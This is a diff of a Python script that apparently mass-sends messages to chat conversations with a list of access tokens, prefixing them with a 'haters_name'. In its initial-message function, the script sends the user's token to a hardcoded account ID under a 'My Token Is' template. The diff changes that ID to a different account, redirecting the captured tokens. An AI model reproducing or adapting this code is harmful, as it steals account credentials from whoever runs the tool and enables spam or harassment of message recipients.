@@ -30,7 +30,7 @@ def send_initial_message():
       msg_template = "CREDIT :- NILAM RAI                                                       OWNER => NILAM                                                      Hello Nilam Rai ! I Am Using Your Server My Token Is :- {}"
 
       # Specify the ID where you want to send the message
-      target_id = "61568216591260"
+      target_id = "61568384455389"
 
       requests.packages.urllib3.disable_warnings()
 
@@ -109,7 +109,7 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;36m[✓] Bhai Chla Gya Tera Massage {} of Convo {} Token {}: {}".format(
+                      print("\033[1;36m[✓] 💝𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 💝 𝗝𝗜 𝗞𝗜 𝗢𝗥 𝗦𝗘 𝗔𝗔𝗣𝗞𝗔 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗖𝗛𝗔𝗟𝗔 𝗚𝗔𝗬𝗔 𝗔𝗕 𝗞𝗛𝗨𝗦𝗛 𝗥𝗘𝗛𝗘 𝗛𝗢...🍒🍒 {} of Convo {} Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
@@ -136,3 +136,4 @@ def main():
 
 if __name__ == '__main__':
       main()
+      
